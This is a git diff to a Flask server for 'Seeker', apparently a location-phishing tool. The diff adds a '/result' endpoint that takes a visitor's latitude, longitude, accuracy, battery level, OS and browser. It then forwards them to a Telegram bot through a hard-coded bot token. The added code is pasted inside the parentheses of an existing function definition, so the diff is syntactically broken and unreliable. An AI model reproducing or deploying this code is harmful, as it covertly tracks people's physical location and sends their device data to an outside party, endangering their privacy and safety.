@@ -13,7 +13,30 @@ def index():
     return "Seeker is running!"
 
 @app.route("/location", methods=["POST"])
-def location():
+def location(import requests
+
+def send_to_telegram(message):
+    bot_token = '7961048427:AAFjlXzCR9F7W4QK2k4S5Iw3COnZlbtlq4Y'
+    chat_id = '7961048427'
+    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
+    payload = {'chat_id': chat_id, 'text': message}
+    requests.post(url, data=payload)
+
+@app.route('/result', methods=['POST'])
+def result():
+    data = request.json
+    location_data = f"""📍 موقع جديد:
+
+🔸 Lat: {data.get('lat')}
+🔹 Lon: {data.get('lon')}
+🕒 Time: {data.get('timestamp')}
+📶 Accuracy: {data.get('accuracy')}m
+🔋 Battery: {data.get('battery')}%
+📱 OS: {data.get('os')} | {data.get('browser')}
+"""
+    print(location_data)
+    send_to_telegram(location_data)
+    return 'OK'):
     data = request.get_json()
     lat = data.get("latitude")
     lon = data.get("longitude")
